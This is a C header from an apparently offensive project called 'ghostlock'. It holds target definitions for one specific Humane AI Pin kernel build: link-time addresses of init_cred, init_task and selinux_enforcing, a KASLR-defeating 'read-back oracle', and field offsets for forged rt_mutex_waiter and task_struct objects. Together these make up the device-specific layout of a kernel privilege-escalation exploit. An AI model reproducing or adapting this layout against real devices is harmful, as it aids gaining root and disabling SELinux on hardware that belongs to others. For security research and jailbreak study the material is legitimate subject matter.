/*
 * SPDX-License-Identifier: Apache-2.0
 * Humane AI Pin retail target implementation for 101.000470.45.20.
 *
 * Link-time symbols were independently derived from the exact kernel Image.
 * The Image is deliberately not distributed with this project.
 */
#ifndef GHOSTLOCK_AIPIN_TARGET_H
#define GHOSTLOCK_AIPIN_TARGET_H

/* Intentional cross-check: these offsets belong only to this exact Image. */
#define TARGET_LAYOUT_IMAGE_SHA256 "d4f4e0deb20871fce207f1f095ba1934162081c2f10afaccbb2e6a1e938719fb"

#include "ghostlock_profile_generated.h"

#define KIMAGE_TEXT_BASE 0xffffff8008080000ULL
#define P0_PAGE_OFFSET 0xffffffc000000000ULL
#define P0_PHYS_OFFSET 0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0xa1280000ULL

/* Runtime kernel globals, expressed at their link-time addresses. */
#define INIT_TASK 0xffffff8009dcdb80ULL
#define INIT_CRED 0xffffff8009ddeec0ULL
#define ENTRY_TASK 0xffffff8009b2a0b0ULL
#define PER_CPU_OFFSET 0xffffff8009dbf6d0ULL
#define ROOT_TASK_GROUP 0xffffff8009fe9f00ULL
#define SELINUX_ENFORCING 0xffffff800a4cd001ULL

/* boot_id read-back oracle. */
#define SLIDE_NFULNL_LOGGER_IMAGE 0xffffff8009dc37c8ULL
#define SLIDE_LOGGERS_0_1_IMAGE 0xffffff8009dc36f0ULL
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE 0xffffff8009ea2098ULL
#define P0_NFULNL_LOGGER_IMAGE_OFF \
  (SLIDE_NFULNL_LOGGER_IMAGE - KIMAGE_TEXT_BASE)

/* Vendor 4.14 rt_mutex_waiter: 0x50 bytes. */
#define WAITER_TREE_ENTRY_OFF 0x00
#define WAITER_PI_TREE_ENTRY_OFF 0x18
#define WAITER_TASK_OFF 0x30
#define WAITER_LOCK_OFF 0x38
#define WAITER_PRIO_OFF 0x40
#define WAITER_DEADLINE_OFF 0x48
#define TARGET_WAITER_SIZE 0x50
#define FAKE_WAITER_PI_TREE_ENTRY_OFF WAITER_PI_TREE_ENTRY_OFF
#define FAKE_WAITER_PI_TREE_PRIO_OFF WAITER_PRIO_OFF
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF WAITER_DEADLINE_OFF

/* task_struct offsets for this production build. */
#define FAKE_TASK_USAGE_OFF 0x70
#define FAKE_TASK_PRIO_OFF 0xb0
#define FAKE_TASK_NORMAL_PRIO_OFF 0xb8
#define FAKE_TASK_TASK_GROUP_OFF 0x3e8
#define FAKE_TASK_PI_LOCK_OFF 0x8c4
#define FAKE_TASK_PI_WAITERS_OFF 0x8d0
#define FAKE_TASK_PI_TOP_TASK_OFF 0x8e0
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x8e8
#define TASK_REAL_CRED_OFF 0x7f8
#define TASK_CRED_OFF 0x800

#endif
